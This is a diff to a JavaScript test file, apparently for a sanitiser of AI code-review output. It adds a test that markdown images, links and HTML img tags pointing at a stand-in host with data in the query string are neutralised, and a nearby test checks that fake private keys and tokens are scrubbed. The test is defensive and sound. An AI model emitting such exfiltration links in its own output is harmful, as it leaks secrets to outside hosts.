@@ -379,6 +379,13 @@ test('a failed search-tool setup is named as the reason', async () => {
   assert.match(r.reason, /search tools could not be set up/);
 });
 
+test('images, links and HTML cannot carry data off the platform', async () => {
+  const r = await verdict([gateInit(), answer(), done('VERDICT: FINDINGS\n1. [P1] a.js:1 — see ![x](https://evil.example/?d=secret) and [y](https://evil.example/?d=2) and <img src="https://evil.example/?d=3">')]);
+  assert.equal(r.verdict, 'findings');
+  assert.ok(!/!\[|\]\(|<img/.test(r.text), r.text);
+  assert.ok(r.text.includes('&lt;img'));
+});
+
 test('private keys and other credential shapes are scrubbed', async () => {
   const r = await verdict([gateInit(), answer(),
     done('VERDICT: FINDINGS\n1. [P0] k.pem:1 — -----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY----- AKIAABCDEFGHIJKLMNOP github_pat_abcdefghijklmnopqrstuvwxyz xoxb-1234567890-abc')]);
